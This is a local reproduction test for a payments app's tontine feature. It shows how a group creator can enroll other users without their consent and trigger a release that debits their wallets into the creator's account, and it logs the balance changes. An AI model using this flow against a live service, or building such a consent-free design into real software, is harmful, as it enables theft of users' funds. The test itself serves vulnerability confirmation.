/**
 * LOCAL REPRODUCTION ONLY (production base 7d262de, disposable local DB).
 * Tontine drain: a creator lists people by handle (no consent), then calls "release":
 * every listed member's wallet is debited into the creator's personal wallet, and the
 * rotation-0 payout goes to the creator. Uses the real 7d262de handlers.
 */
import '../helpers/setup.js';
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { createUserWithWallet, mockReq, mockRes, prisma } from '../helpers/db.js';
import { tontineGroups, tontineRelease } from '../../lib/handlers.js';

after(async () => { await prisma.$disconnect(); });
const call = async (h, opts) => { const req = mockReq(opts); const res = mockRes(); await h(req, res); return res; };
const bal = async (userId) => (await prisma.wallet.findUnique({ where: { userId } }));

test('7d262de: creator lists strangers and releases at once → their wallets drained into the creator', async () => {
  const creator = await createUserWithWallet({ balance: 0, koriBalance: 0 });
  const v1 = await createUserWithWallet({ balance: 50_000, koriBalance: 50_000 });
  const v2 = await createUserWithWallet({ balance: 50_000, koriBalance: 50_000 });
  for (const u of [creator, v1, v2]) {
    u.handle = u.handle.replace(/^@/, '');
    await prisma.user.update({ where: { id: u.id }, data: { handle: u.handle } });
  }
  const before = { c: await bal(creator.id), v1: await bal(v1.id), v2: await bal(v2.id) };
  const g = await call(tontineGroups, { userId: creator.id, body: { name: 'Natt piège', amountPerMember: 20_000, frequency: 'monthly', memberHandles: [v1.handle, v2.handle] } });
  assert.ok(g.statusCode < 300, JSON.stringify(g.body));
  const groupId = g.body.id ?? g.body.group?.id;
  const victims = await prisma.tontineMembership.findMany({ where: { groupId } });
  console.log('members added without any consent step:', victims.length);
  const r = await call(tontineRelease, { userId: creator.id, query: { id: groupId } });
  console.log('release status', r.statusCode);
  const after2 = { c: await bal(creator.id), v1: await bal(v1.id), v2: await bal(v2.id) };
  const delta = (k, f) => after2[k][f] - before[k][f];
  console.log(JSON.stringify({ creatorBalanceDelta: delta('c', 'balance'), victim1Delta: delta('v1', 'balance'), victim2Delta: delta('v2', 'balance'), creatorKoriDelta: delta('c', 'koriBalance'), victim1KoriDelta: delta('v1', 'koriBalance') }));
});
